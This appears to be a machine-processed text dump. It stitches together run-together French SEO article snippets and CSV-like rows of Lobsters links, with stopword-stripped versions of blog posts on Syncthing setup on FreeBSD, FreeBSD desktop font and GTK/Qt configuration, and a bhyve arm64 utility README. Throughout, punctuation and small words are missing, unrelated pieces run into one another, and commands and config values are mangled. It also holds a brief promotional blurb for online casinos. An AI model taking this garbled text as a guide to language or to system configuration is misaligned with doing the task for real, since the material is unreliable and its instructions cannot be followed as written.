féminins est insignifiant puisque la beauté féminine enflamme plus de nombreux internautes sur le réseaux sociaux cest lexemple de monica bellucci une actrice très célèbre en matière de mode alors quels sont le atouts de monica bellucci dans la mode fait le point il arrive très souvent pendant le printemps par exemple que de abeilles domestiques quittent leur ruche pour former un essaim dans un lieu où il se sentent en sécurité et à laise il peut sagir dune poutre dune branche darbre ou dun quelconque endroit tranquille au sein de votre jardin évidemment tout le monde ne basé aux étatsunis et plus précisément à chicago activecampaign est un fournisseur de logiciel de marketing et dautomatisation de ventes quon ne présente plus faisons une immersion dans lunivers de cette société en nous intéressant à s atouts marketing lautomatisation latout premier lun de terrain sur lesquels activecampaign se distingue cest bien celui de face à l incendie ou à un nombre croissant de cambriolages il est impératif de sécuriser sa maison par le solution coûteuses il existe plusieurs autres se caractérisant par leur facilité de mise en place la sécurité de porte pour introduire dans une maison le cambrioleurs passent généralement par la porte entrée pour conséquent vous la laine pashmina encore connue sou le nom simple de pashmina est une laine très fine qui est créée à partir du sousduvet de la toison de chèvres ce produit qui est un coussin du cachemire un diamètre très faible cette laine connue aussi sou le nom de de fibre est utilisée dans vous n êtes pa sans savoir que décrocher un emploi n est pa une mince affaire chacun fait ce qu il peut pour tirer son épingle du jeu si vous êtes dans la recherche dans un emploi cet article vous est destiné afin augmenter vos chance de décrocher un emploi envoyez beaucoup de candidature spontanées il vous plaît le saviezvous séjourner dans un appartement trop humide peut avoir un impact négatif sur votre santé l humidité peut engendrer un inconfort et rendre la vie pénible dans votre logement que vous ayez de enfants ou de personnes à charge l humidité peut avoir de effets négatifs sur leur santé vivre dans un appartement trop humide vous rêvez de quitter la location et avoir votre propre appartement c est bien possible et il ne agit pa uniquement un appartement quelconque l appartement dont vous rêvez nous vous donnons le astuces pour l avoir le étapes de recherche de votre appartement lorsque vous cherchez l appart de vos rêves vous ne devez pa être pressé cest parfois fatiguant daller dans un casino pour vous faire un peu de sou aujourdhui vous naurez plus ce mal il existe de casino en ligne canada très légales pour vous faire de sou rien quen etant assis confortablement chez vous notez quil sagit de casino exclusivement canadien du casino traditionnel canadien au casino en derrière la structure physique de toute entreprise se cache un ensemble de mécanismes destinés à régler différents aspect pour son fonctionnement optimal dans cette organisation immatérielle la gestion de la paie occupe une place particulièrement sensible lisez no conseils pour une bonne gestion de la paie dans votre entreprise utilisez un logiciel approprié et associez après un parcours académique excellent avec l obtention de diplômes vous rêvez un bon emploi bien rémunéré vous avez la ferme intention de trouver le plus rapidement possible l emploi de vos rêves et vous n êtes pa du genre à attendre que l emploi tombe du ciel mais avec le marché de l emploi saturé vous ne savez pa chaque année de milliers de personnes ou de familles voyagent de part et dautres au bout du monde elles sont dans la plupart du temp à la recherche dun endroit qui leur permettra de se détendre et de prendre de nouvelles force seychelles un pay pour le tourisme le seychelles sont un ensemble incroyable de voilà que votre parcelle est pleine construction et là j imagine que ce serait une maison à étage ou bien une simple concession dans ce ca la mise en place de escaliers avère indispensable alors à quelle forme escalier vous vous pensez la réponse à cette question vous serum détaillée dans cet article que nous le jean est un vêtement qui est imposé à plusieurs sociétés au fil de années au point être parmi le vêtements le plus exportés au monde il en aussi bien de modèles pour hommes que pour femmes quels sont donc le avantages de cet vêtement c est ce que nous vous invitons à découvrir la conquête de nouveaux client reste pour tout administrateur de site web un objectif permanent pour toucher le marché international votre site doit répondre à plusieurs critères dont l un de plus importants est la traduction web quel est le véritable intérêt en termes de croissance de chiffre affaire améliorer l expérience utilisateur l internaute qui vient sur seulement disponible aux étatsunis pour le moment la nouvelle fonctionnalité de google devrait tout de même plaire à plusieurs google permet désormais de partager de image en format gif animé depuis la serp de votre moteur de recherche image vers autres application de gif dans toutes vos conversation qui n aime pa envoyer de gif pendant nombreuses sont le femmes qui ont régulièrement leurs menstruation toutes le quatre semaines rencontre aussi de femmes qui doivent attendre plusieurs mois avant de le avoir autres le voient arriver jours à peine après la fin de précédentes se demande ce qui pourrait engendrer une telle divergence entre le cycle menstruels le le protéines gamma gt sont indispensables dans le fonctionnement de membrane cellulaires cependant lorsque le taux de gamma gt devient important dans l organisme c est le début un problème de santé qu il faut immédiatement analyser cet article aborde le cause et conséquence du taux élevé de ce enzyme et propose quelques solution pour le diminuer le vous en avez marre de payer le loyer vous avez envie avoir votre propre maison ou mieux vous avez déjà trouvé la maison dont vous avez toujours rêvée mais vous avez de revenus moyens ou faibles vous empêchant de réaliser votre rêve sachez qu il de moyens pour avoir son propre logement sans sortir vous êtes certainement dans le désir acheter un bien immobilier ou vous avez déjà signé un compromis de vente présent ce qui fait votre cassetête c est la banque qu il faut choisir pour votre financement immobilier la question tourne autour du choix entre le gross banques ou le organismes régionaux il faut donc connaître le le cauchemar du harcèlement téléphonique hante tous le utilisateurs de cet outil de communication dans la recherche de solution contre ce fléau l annuaire inversé gratuit se révèle comme un dispositif technologique puissant pour le contrer cet article présente ce logiciel pratique disponible en ligne l annuaire inversé gratuit pour identifier le numéros de téléphone portable il vous avez une idée de projet et vous voulez créer votre entreprise vous avez convaincu de partenaires pour vous soutenir vous voulez démarquer votre entreprise de vos concurrents ou encore faire véhiculer de valeurs auprès de vos client vous désirez peutêtre simplement soigner l image de votre entreprise le tout commence par votre logo cet article une playlist est un ensemble de musiques ou de vidéos que l aime souvent écouter tout internaute peut en créer et en partager si vous avez envie de regrouper le musiques ou le vidéos le plus entraînants pour suivre votre séance de gym ou pour réussir votre soirée optez pour le playlist le présent article il vous est certainement déjà arrivé de perdre la clé de votre cadenas cherche alors à le déverrouiller par tous le moyens pour récupérer ce qui est enfermé vous recherchez de méthodes simple et rapide pour déverrouiller un cadenas sans code ou sans clé cet article vous fournira le nécessaire de quoi avez besoin l arrivée de l été marque souvent le début de la saison de feux artifice et la france peut se vanter en avoir parmi le plus beau du monde nous vous emmenons à découverte de quelquesuns de plus beau feux artifice de france le master de feu de compiègne débutons ce classement de feux artifice en france la ville de bonneville est un lieu au riche patrimoine touristique et artistique au cœur de la vallée de l arve dans la faucigny si vous n avez pa encore visité un coin du monde où la nature vous offre l opportunité de vivre une exceptionnelle expérience touristique cette ville doit être votre prochaine destination découvrez ici pourquoi
326,Lobsters,freebsd,FreeBSD,Syncthing on FreeBSD,https://vermaden.wordpress.com/2018/08/21/syncthing-on-freebsd/,syncthing freebsd,rsync http syncthingnet wikipedia nextcloud freebsd host etcrcconf newaliases v ln usrsharezoneinfoeuropewarsaw etclocaltime date echo nameserver etcresolvconf ping c freebsdorg cat etcrcconf install pkg grep url etcpkgfreebsdconf sed squarterlylatestg etcpkgfreebsdconf grep url etcpkgfreebsdconf pkg env assumealwaysyesyes pkg update f pkg pkg install syncthing syncthing id syncthing netsyncthing pkg info l syncthing configuration syncthingenableyes etcrcconf usrlocaletcrcdsyncthing rcvar grep syncthingenable etcrcconf rc le n usrlocaletcrcdsyncthing varlogsyncthinglog l varlogsyncthinglog varlogsyncthinglog chown syncthing syncthing varlogsyncthinglog l l varlogsyncthinglog newsyslog cat etcnewsyslogconfdsyncthing eof logfilename owner group mode count size flag pidfile varlogsyncthinglog syncthing syncthing jc eof cat etcnewsyslogconfdsyncthing newsyslog v grep syncthing service syncthing start varrunsyncthingpid chown syncthing syncthing varrunsyncthingpid l l varrunsyncthingpid service syncthing start sockstat l grep syncthing cat varlogsyncthinglog warning sync service syncthing stop find usrlocaletcsyncthing warning sync grep sync usrlocaletcsyncthingconfigxml l sync mkdir syncthing chown syncthing syncthing syncthing chmod syncthing vi usrlocaletcsyncthingconfigxml grep syncthing usrlocaletcsyncthingconfigxml grep relay usrlocaletcsyncthingconfigxml vi usrlocaletcsyncthingconfigxml grep relay usrlocaletcsyncthingconfigxml grep globalannounce usrlocaletcsyncthingconfigxml vi usrlocaletcsyncthingconfigxml grep globalannounce usrlocaletcsyncthingconfigxml varlogsyncthinglog service syncthing stop varlogsyncthinglog service syncthing start cat varlogsyncthinglog tl false grep b usrlocaletcsyncthingconfigxml vi usrlocaletcsyncthingconfigxml grep b usrlocaletcsyncthingconfigxml service syncthing stop varlogsyncthinglog service syncthing start cat varlogsyncthinglog http setting general gui admin syncthingpassword connection save default folder edit remove yes fdroid google play restart camera hamburger menu web gui blackboxlocal remote device remote device add remote device blackboxlocal save blackboxlocal remote device camera blackboxlocal blackboxlocal add device save remote device camera add share device sync syncing camera find syncthing type usrlocaletcsyncthingconfigxml xmlkey xml update syncthing freebsd bsd openbsd surfacing like,article show setup syncthing freebsd system one warning beginning character syncthing configuration file changed respectively wordpress limitation remember syncthing config xml file personal backup need always use rsync limited device phone tablet real pita thus automated import photo file device prefer use syncthing tool heard yet cite syncthing http syncthingnet site syncthing replaces proprietary sync cloud service something open trustworthy decentralized data data alone deserve choose stored shared third party transmitted internet wikipedia syncthing free opensource peertopeer file synchronization application available window mac linux android solaris darwin bsd sync file device local network remote device internet data security data safety built design software one may ask different nextcloud example well nextcloud almost entire cloud stack custom application disposal syncthing synchronization tool device nothing initially wanted similarly like nextcloud freebsd setup everything freebsd jail problem syncthing work freebsd jail virtualization figured several hour trying find wrong management interface syncthing working expected accessible syncthing android mobile phone able connectsync syncthing instance freebsd jail sure could connect syncthing management interface phone still could backup using syncthing protocol knowing limitation option choose setup syncthing freebsd host like service use freebsd bhyve virtualization syncthing instance use virtualbox packageport syncthing instance chosen first option actually bhyve virtualbox additional work needed virtualization layer use android based mobile phone example syncthing client sync data computer well one thing thing syncthing server syncthing client syncthing instancesinstallations addremove device directory synchronize device used term client show automating copying file phone freebsd server syncthing instance nothing host basic step done freebsd host thing like alias database timezone dns basic freebsd setting etcrcconf core file newaliases v etcmailaliases alias longest byte byte total ln usrsharezoneinfoeuropewarsaw etclocaltime date fri aug cest echo nameserver etcresolvconf ping c freebsdorg ping freebsdorg data byte byte m byte m byte m freebsdorg ping statistic packet transmitted packet received packet loss roundtrip minavgmaxstddev m main freebsd configuration file cat etcrcconf network hostnameblackboxlocal inet defaultrouter daemon yes zfsenableyes sshdenableyes ntpdenableyes syncthingenableyes syslogdflags daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno dumpdevno updatemotdno virecoverenableno cleartmpenableyes install first switch quarterly latest pkg branch get date package grep url etcpkgfreebsdconf url pkghttp pkgfreebsdorg abi quarterly sed squarterlylatestg etcpkgfreebsdconf grep url etcpkgfreebsdconf url pkghttp pkgfreebsdorg abi latest bootstrap pkg update database latest available one env assumealwaysyesyes pkg update f bootstrapping pkg pkghttp please wait verifying signature trusted certificate done syncthinglocal installing syncthinglocal extracting updating freebsd repository catalogue pkg repository freebsd load error access repo file vardbpkgrepofreebsdsqlite failed file directory syncthinglocal fetching metatxz b syncthinglocal fetching packagesitetxz mib processing entry freebsd repository update completed package processed repository date install syncthing pkg package pkg install syncthing updating freebsd repository catalogue freebsd repository date repository date following package affected checked new package installed syncthing number package installed process require mib space mib downloaded fetching mib checking integrity done conflicting installing creating group creating group syncthing gid creating user creating user syncthing uid extracting message warning version backwards compatible release information please read http http http http syncthing package created syncthing user group u id syncthing syncthing syncthing syncthing look small syncthing file installed netsyncthing package pkg info l syncthing usrlocalbinstbench usrlocalbinstcli usrlocalbinstcompdirs usrlocalbinstdisco usrlocalbinstdiscosrv usrlocalbinstevents usrlocalbinstfileinfo usrlocalbinstfinddevice usrlocalbinstgenfiles usrlocalbinstindex usrlocalbinstrelaypoolsrv usrlocalbinstrelaysrv usrlocalbinstsigtool usrlocalbinsttestutil usrlocalbinstvanity usrlocalbinstwatchfile usrlocalbinsyncthing usrlocaletcrcdsyncthing usrlocaletcrcdsyncthingdiscosrv usrlocaletcrcdsyncthingrelaypoolsrv usrlocaletcrcdsyncthingrelaysrv usrlocalsharedocsyncthingauthors usrlocalsharedocsyncthinglicense usrlocalsharedocsyncthingreadmemd configuration show already syncthingenableyes added etcrcconf file usrlocaletcrcdsyncthing rcvar syncthing syncthingenable default grep syncthingenable etcrcconf syncthingenableyes also syncthing rc startup script may check startup option le n usrlocaletcrcdsyncthing add following line etcrcconflocal etcrcconf enable service syncthingenable bool set default set yes enable syncthing syncthinghome path directory syncthing configuration data stored default usrlocaletcsyncthing syncthinglogfile path syncthing log file default varlogsyncthinglog syncthinguser user set user run syncthing default syncthing syncthinggroup group set group run syncthing default syncthing syncthing need varlogsyncthinglog log file let create set proper owner right l varlogsyncthinglog l varlogsyncthinglog file directory varlogsyncthinglog chown syncthing syncthing varlogsyncthinglog l l varlogsyncthinglog rwxrxrx syncthing syncthing varlogsyncthinglog using log file also need take care rotation use builtin freebsd newsyslog daemon purpose cat etcnewsyslogconfdsyncthing eof logfilename owner group mode count size flag pidfile varlogsyncthinglog syncthing syncthing jc eof cat etcnewsyslogconfdsyncthing logfilename owner group mode count size flag pidfile varlogsyncthinglog syncthing syncthing jc newsyslog v grep syncthing processing etcnewsyslogconfdsyncthing varlogsyncthinglog size kb skipping let try start syncthing first time service syncthing start starting syncthing daemon pidfile varrunsyncthingpid permission denied usrlocaletcrcdsyncthing warning failed start syncthing seems rc syncthing startup create pid file automatically let create varrunsyncthingpid chown syncthing syncthing varrunsyncthingpid l l varrunsyncthingpid rwxrxrx syncthing syncthing varrunsyncthingpid let try start syncthing service syncthing start starting syncthing better let see port use sockstat l grep syncthing syncthing syncthing syncthing syncthing syncthing syncthing syncthing syncthing check log file cat varlogsyncthinglog start info generating ecdsa key certificate syncthing info syncthing dysprosium dragonfly root utc noupgrade info id info single thread performance mb using mb using info default folder created andor linked new config info default config saved edit usrlocaletcsyncthingconfigxml taste use gui info hashing performance mb info updating database schema version info updated symlink type index entry added invalid file global list info finished updating database schema version info stored folder metadata default recalculating warning creating directory default folder default mkdir sync permission denied warning creating folder marker folder path missing info ready synchronize default folder default readwrite info overall send rate unlimited receive rate unlimited info rate limit apply lan connection info using discovery server http nolookup info using discovery server http nolookup info using discovery server http noannounce info tcp listener starting info relay listener dynamichttps relayssyncthingnetendpoint starting warning error folder default folder default folder path missing info failed initial scan readwrite folder default folder default info device blackboxlocal dynamic info loading http certificate open usrlocaletcsyncthinghttpscertpem file directory info creating new http certificate info gui api listening info access gui via following url http info joined relay relay info detected nat service several warning message default sync directory let fix service syncthing stop stopping syncthing waiting pid upon first syncthing start rc startup script created usrlocaletcsyncthing directory configuration find usrlocaletcsyncthing usrlocaletcsyncthing usrlocaletcsyncthinghttpscertpem usrlocaletcsyncthinghttpskeypem usrlocaletcsyncthingcertpem usrlocaletcsyncthingkeypem usrlocaletcsyncthingconfigxml let get back fixing warning sync directory grep sync usrlocaletcsyncthingconfigxml folder id default label default folder path sync type readwrite rescanintervals fswatcherenabled true fswatcherdelays ignoreperms false autonormalize true l sync l sync file directory let create dedicated directory syncthing instance set also usrlocaletcsyncthingconfigxml config file mkdir syncthing chown syncthing syncthing syncthing chmod syncthing vi usrlocaletcsyncthingconfigxml grep syncthing usrlocaletcsyncthingconfigxml folder id default label default folder path syncthing type readwrite rescanintervals fswatcherenabled true fswatcherdelays ignoreperms false autonormalize true also disable relay global announce server left local announce server enabled grep relay usrlocaletcsyncthingconfigxml relaysenabled true relaysenabled relayreconnectintervalm relayreconnectintervalm vi usrlocaletcsyncthingconfigxml grep relay usrlocaletcsyncthingconfigxml relaysenabled false relaysenabled relayreconnectintervalm relayreconnectintervalm grep globalannounce usrlocaletcsyncthingconfigxml globalannounceserver default globalannounceserver globalannounceenabled true globalannounceenabled vi usrlocaletcsyncthingconfigxml grep globalannounce usrlocaletcsyncthingconfigxml globalannounceserver default globalannounceserver globalannounceenabled false globalannounceenabled restarting syncthing let clean varlogsyncthinglog file eliminate unneeded information service syncthing stop stopping syncthing varlogsyncthinglog service syncthing start starting syncthing let check log hold u cat varlogsyncthinglog info syncthing dysprosium dragonfly root utc noupgrade info id info single thread performance mb using mb using info hashing performance mb info ready synchronize default folder default readwrite info overall send rate unlimited receive rate unlimited info rate limit apply lan connection info device blackboxlocal dynamic info tcp listener starting info completed initial scan readwrite folder default folder default info gui api listening info access gui via following url http see management interface listens http http tl option set false also need switch management interface address localhost ip address grep b usrlocaletcsyncthingconfigxml gui enabled true tl false debugging false address address apikey apikey theme default theme gui vi usrlocaletcsyncthingconfigxml grep b usrlocaletcsyncthingconfigxml gui enabled true tl true debugging false address address apikey apikey theme default theme gui let verify change service syncthing stop stopping syncthing varlogsyncthinglog service syncthing start starting syncthing cat varlogsyncthinglog info syncthing dysprosium dragonfly root utc noupgrade info id info single thread performance mb using mb using info hashing performance mb info ready synchronize default folder default readwrite info overall send rate unlimited receive rate unlimited info rate limit apply lan connection info tcp listener starting info completed initial scan readwrite folder default folder default info device blackboxlocal dynamic info gui api listening info access gui via following url http info detected nat service log clean continue browser http management interface rest syncthing configuration browser course warn u untrusted http certificate syncthing ask u agree upon sharing statistic data leave choice syncthing dashboard welcome u big red warning remote administration allowed without password fix moment click setting button warning leave first general tab unmodified gui tab create user admin syncthingpassword password syncthing management interface use something sensible modified setting connection tab click save continue besides setting user password changedset option syncthing without error prompted user password moment remove default folder needed hit edit button click remove button bottom click yes confirmation empty syncthing dashboard next download install configure syncthing android phone depending preference use fdroid repository google play repository apk file source choice installed syncthing application shown take mb let start see welcome message syncthing application depending android version phone may ask allow syncthing various permission agree earlier syncthing ask agree sharing statistic data also leave choice syncthing require restart tap restart continue default camera directory preconfigured pointing directory hold photo screenshots taken phone enough use tap syncthing hamburger menu button select web gui option see management interface syncthing android phone scroll add blackboxlocal syncthing instance freebsd remote device section remote device section hit add remote device button remember local announce service left enabled come handy syncthing instance id freebsd displayed automatically detected network click displayed id enter blackboxlocal hostname besides entering clicking id hostname set option click save blackboxlocal added remote device list camera directory property remember select blackboxlocal allowed host small yellow slider blackboxlocal device property let get back freebsd syncthing instance management interface browser prompted add syncthing android phone case device hit green add device button click save without adding option device android phone visible remote device section prompted device want share camera directory hit green add button enter folder label directory name freebsd syncthing instance also make sure selected share device section bottom device folder device configured first see sync message folder synchronization start whose progress observed phone management interface freebsd syncthing instance browser folder switched status syncing progress see similar status android phone file see folder status date mean file camera directory synchronized freebsd syncthing instance createdsynced directory android phone look follows freebsd syncthing instance find syncthing type syncthing camera file synced backup complete syncthing config freebsd instance available usrlocaletcsyncthingconfigxml download rename xmlkey xml file wordpress limitation update syncthing freebsd article featured bsd openbsd surfacing episode thanks mentioning eof like like loading related
327,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 15 - Configuration - Fonts & Frameworks,https://vermaden.wordpress.com/2018/08/18/freebsd-desktop-part-15-configuration-fonts-frameworks/,freebsd desktop part configuration font framework,fast furious freebsd desktop global page font system setting fontconfig usrlocaletcfonts fontconfig pkgwhich pkg usrlocaletcfontsfontsconfsample l usrlocaletcfontsconfavail l usrlocaletcfontsconfd file usrlocaletcfontsconfd conf pkg file done fontconfig usrlocaletcfontsfontsconf usrlocaletcfontslocalconf usrlocaletcfontsfontsconf fontconfig user setting config font font fontstargz pkg font fontsconf configfontconfigfontsconf configfontconfigfontsconf configfontconfigfontsconf example fontsswaptesthtml configfontconfigfontsconf fontconfig configfontconfigfontsconf fccachesh framework gtk compton export xinitrc lxapperance cat theme icon fcmatch fontconfig fcmatch ubuntu fcmatch ubuntu gtkxft gtkbookmarks cat gtkbookmarks cat cat cs gtk cs overview qt export xinitrc qtconfig configtrolltechconf cat configtrolltechconf export xinitrc xsession cat back xdefaults xdefaults xresources xinitrc back xinitrc update adwaitaqt pkg install grep b style configtrolltechconf grep b adwaita like,title article kinda sound like fast furious title part freebsd desktop series focus font setting gtkqt framework configuration make application based look good least better may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content font proper rendering font system easy task even popular desktop oriented operating system like macos mac o x window problem course focus freebsd font setting information reusable operating system use window system desktop duplicate knowledge already available topic please read two source handling font freebsd operating system system setting font rendering window system desktop made fontconfig package system wide configuration kept usrlocaletcfonts directory even verify belongs fontconfig package pkgwhich command pkg usrlocaletcfontsfontsconfsample usrlocaletcfontsfontsconfsample installed package font setting two directory purpose usrlocaletcfontsconfavail usrlocaletcfontsconfd want enable feature create symlink usrlocaletcfontsconfd directory lead small config file usrlocaletcfontsconfavail directory available option l usrlocaletcfontsconfavail option enabled system l usrlocaletcfontsconfd readme may even check filesfeatures enabled package file usrlocaletcfontsconfd conf pkg file done found database installed package installed package found database found database found database installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package installed package setting course make fontconfig package see file installed package symlinkedconfigured setting seems make font look best repeat setting various file use found database found database found database found database would like make system wide setting use provided usrlocaletcfontsfontsconf file use usrlocaletcfontslocalconf instead usrlocaletcfontsfontsconf file replaced next fontconfig package update user setting keep settingsfonts user home dir like config font directory easier movebackupimport edit merge system file everytime font kept font directory course share font directory list font available download fontstargz file arvo calibri cambria cantarell clear sans consolas constantia corbel cormorant cosmic sans neue mono courier prime code courier prime sans fira code fira mono fira sans francophil sans garamond georgia ibm plex mono ibm plex sans inconsolata monofur monoid pro font window proggy tiny zero pt sans sv basic manual trebuchet m ubuntu ubuntu mono would say consolas ubuntu mono inconsolata one best monospaced font trebuchet m probably best looking properly rendered font nonmonospacedsans serif font category also really like fira ibm plex also ubuntu family new cantarell font also pretty nice lot font installed using installing freebsd port category pkg package simpler keep move font directory install package everytime need also keep one needuse portpackage often provides set long time user configuration font kept fontsconf file new place configfontconfigfontsconf file mine config long check content wordpress quite nice platform problem render properly content html xml introduce eventual problem related post screenshot config along link configfontconfigfontsconf file setting forged year time first using slackware gentoo linux since freebsd see comment swap several bad looking font good looking one example like arial font may want swap trebuchet m font snippet added configfontconfigfontsconf file similarly another xml snippet post screenshot config along link example file make test use simple fontsswaptesthtml html file look epiphany change configfontconfigfontsconf file arial font swapped trebuchet m one sure epiphany firefox midori respect swap tried browser remember reload fontconfig cache change configfontconfigfontsconf file may using already posted fccachesh script framework also call toolkits thing like gtk qt category gtk favorite framework least pita one time good looking desktop always ugly fast light ugly think agree time gnome considered heavy desktop environment mostly deprecated application still use still work good favor gnome dead fortunately forked project named mate mate seems light irony fortunately old gnome file manager nautilus seems one best file manager unix system sure lightestfastest one one suit lotsmost need mate team nautilus rebranded caja caja accompanied thunar xfce desktop environment mass rename tool seems universal solution graphical file management unix also look similarcoherent use toolkit used framework gnome apps use exclusively may also check cinnamon gnome fork idea provide gnome classic experience based modern tool modern framework mate desktop also moved two gnome successor based problematic framework application probably one written onfor gnome environment come builtin window buttonshandlers overwritingignoring one provided window manager long ago default setting left additional border pixel side window use compositionshadows manager like compton waste screen space find example month ago problem fortunately gone additional border epiphany example gnome app worksdisplays properly shown useused environment variable exported export sure still respected want check apps find keeping xinitrc file hurt gtk antialiasing export configuration framework kept file alternatively use various graphical toolsmanagers setting like lxapperance may want use instead mine file content cat include gtkthemename arc gtkiconthemename faenza gtkfontname ubuntu gtktoolbarstylegtktoolbaricons gtktoolbariconsizegtkiconsizesmalltoolbar gtkxfthintstyle hintnone gtkxftrgba rgb selected theme arc use portpackage icon theme faenza use portpackage user gtk theme kept theme directory icon set kept icon directory also set font ubuntu size remember also set ubuntu ubuntu check font selected type use fcmatch command fontconfig package fcmatch ubuntu ubuntuttf ubuntu regular fcmatch ubuntu ubuntuttf ubuntu regular last setting gtkxft one related font rendering said earlier setting repeated various file currently single file configure font behavior unfortunately file chooser keep configuration file needed configure file bookmark stored gtkbookmarks file content mine cat gtkbookmarks file homevermadenhydepark hydepark file homevermadenbooks book file homevermadengfx gfx file homevermadengfxwallpapers gfxwallpapers file homevermadengfxscreenshots gfxscreenshots file homevermadenmisc misc file homevermadenmiscaix miscaix file homevermadenmiscbsd miscbsd file homevermadenmischpux mischpux file homevermadenmisclinux misclinux file homevermadenmiscsolaris miscsolaris file homevermadenmischardware mischardware file homevermadenmiscemc miscemc file homevermadenmisctsm misctsm file file homevermadenphotonew photonew file homevermadenvm vm file homevermadenvmiso vmiso file homevermadenvmstorage vmstorage file ordered file main configuration kept file current setting cat setting gtkthemename arc gtkiconthemename faenza gtkfontname ubuntu gtkcursorthemesize gtktoolbarstyle gtktoolbaricons gtktoolbariconsize gtkiconsizesmalltoolbar gtkbuttonimages gtkmenuimages gtkenableeventsounds gtkxftantialias gtkxfthinting gtkxfthintstyle hintnone gtkxftrgba rgb besides little different syntax setting configuration thus comment repeat bookmark kept file syntax toolkit cat file homevermadenhydepark hydepark file homevermadenbooks book file homevermadengfx gfx file homevermadengfxwallpapers gfxwallpapers file homevermadengfxscreenshots gfxscreenshots file homevermadenmisc misc file homevermadenmiscaix miscaix file homevermadenmiscbsd miscbsd file homevermadenmischpux mischpux file homevermadenmisclinux misclinux file homevermadenmiscsolaris miscsolaris file homevermadenmischardware mischardware file homevermadenmiscemc miscemc file homevermadenmisctsm misctsm file file homevermadenphotonew photonew file homevermadenvm vm file homevermadenvmiso vmiso file homevermadenvmstorage vmstorage bookmark bookmark format may symlink one another keep two list favorite place framework us cs may tune need file according documentation provided gnome team gtk cs overview available tried various hack past removing problem toolkit vanished find interesting setting let know qt qt toolkit configuration always real pita changed latest release default theme provided ugly one available download much better kde plasma look quite well making look nice custom window manager environment whole story setting minimized damage tragic qt look also feel gtk configuration unix oriented need edit file qt feel window oriented often need graphical config tool set option properly useused environment variable exported export sure still respected want check apps find keeping xinitrc file hurt qt antialiasing export qt must know config export home export sure current application us legendary opera used sure configuration made using qtconfig graphical utility configuration kept configtrolltechconf file obvious indeed graphical tooleditor installed portpackage current configuration look like yes long ugly cat configtrolltechconf qt clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang nopkgconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig clang fullconfig qt comtrolltechqtqimageiohandlerfactoryinterface gif comtrolltechqtqimageiohandlerfactoryinterface ico comtrolltechqtqimageiohandlerfactoryinterface jpeg jpg comtrolltechqtqimageiohandlerfactoryinterface mng comtrolltechqtqimageiohandlerfactoryinterface svg svgz comtrolltechqtqimageiohandlerfactoryinterface tga comtrolltechqtqimageiohandlerfactoryinterface tiff tif svg svgz svggz comtrolltechqtqiconenginefactoryinterface comtrolltechqtqimageiohandlerfactoryinterface dd comtrolltechqtqimageiohandlerfactoryinterface eps eps epsi epsi epsf epsf comtrolltechqtqimageiohandlerfactoryinterface exr exr comtrolltechqtqimageiohandlerfactoryinterface comtrolltechqtqimageiohandlerfactoryinterface pcx pcx comtrolltechqtqimageiohandlerfactoryinterface pic comtrolltechqtqimageiohandlerfactoryinterface psd psd comtrolltechqtqimageiohandlerfactoryinterface ra ra comtrolltechqtqimageiohandlerfactoryinterface rgb rgb rgba rgba bw bw sgi sgi comtrolltechqtqimageiohandlerfactoryinterface tga tga comtrolltechqtqimageiohandlerfactoryinterface xcf xcf comtrolltechqtqimageiohandlerfactoryinterface xv comtrolltechqtqstylefactoryinterface kvantum qt stylecleanlooks font paletteactive dedede ffffff eeeeee ffffff ffffff dedede ffffff eeeeee ffffdc paletteinactive dedede ffffff ffffff ffffff ffffff dedede ffffff eeeeee ffffdc palettedisabled dedede ffffff ffffff ffffff ffffff dedede eeeeee ffffdc fontpath invalid embedfontstrue resolvesymlinksfalse usertlextensionsfalse ximinputstyleon spot defaultinputmethodxim audiosinkauto videomodeauto guieffectsnone filedialog bytearray qt generic linux lsbg fullconfig generic linux lsbg fullconfig qt comtrolltechqtqimageiohandlerfactoryinterface gif comtrolltechqtqimageiohandlerfactoryinterface jpeg jpg look loaded editor kinda special requires export xinitrc xsession file export ask even want know configuration kept file graphical tooleditor installed portpackage current configuration look like cat appearance custompalettetrue iconthemefaenza standarddialogsdefault stylefusion font fixed variant general variant interface guieffects invalid menushaveiconstrue settingswindow geometry bytearray look loaded editor back xdefaults xdefaults file use xresources instead also contain font information setup cursor theme window system session find setting mentined earlier also copied font xftantialias true xfthinting false xfthintstyle xftdpi xftrgba none cursor xcursortheme vanilladmz xcursorsize cursor theme portpackage xinitrc back record complete gtkqt setting xinitrc file follows qt must know config export home export gtkqt antialiasing export export force libreoffice use gtk theme export oooforcedesktopgnome hope information provided article moved one step closer good looking practical freebsd desktop update one possible way make freebsd desktop toolkits look le ugly default gnome theme adwaita also exists adwaitaqt qt port adwaita theme aim make qt look like gtk adwaita theme make use add package pkg install use set style adwaita default theme setup theme verified like grep b style configtrolltechconf qt styleadwaita start set style adwaita default theme setup theme verified like grep b adwaita appearance styleadwaita transmission rendered gtk toolkit transmission rendered toolkit still perfect least le ugly eof like like loading related
328,Lobsters,freebsd,FreeBSD,FreeBSD-UPB/bhyvearm64-util,https://github.com/FreeBSD-UPB/bhyvearm64-utils,,description prerequisite freebsd linux foundation platform emulator arm compiling running freebsd clone freebsd fork clone utility script modify script build freebsd disk image copy script runimagesh linux download extract uefi foundation emulator modify script runimagesh run host run guest virtio,description freebsd guest able boot start rescue shell minimal set userspace program available virtio device also available virtionet virtioblk virtioconsole virtiornd random device freebsd host tested using foundation platform emulator arm website prerequisite freebsd freebsd installed either bare metal virtual machine need compile host guest using kvm virtual machine linux bare metal linux need linux installed either bare metal virtual machine need run foundation platform emulator work linux tested emulator xubuntu arch linux foundation platform emulator need emulator run host guest download arm downloading require registration also need xterm installed linux compiling running next step run freebsd installation clone freebsd fork git clone b http githubcomfreebsdupbfreebsdgit make sure branch next step clone utility script git clone http modify script modify script variable workspace point parent directory cloned freebsd repo default value assumes freebsd repo building disk image script try rsync image linux installation platform emulator use set exact location modifying variable rsynctarget file build freebsd disk image buildguesty buildworld compile host guest kernel ramdisk skip certain compile stage want example let say already built world want rebuild host kernel want rebuild guest nokernely buildguesty full clean 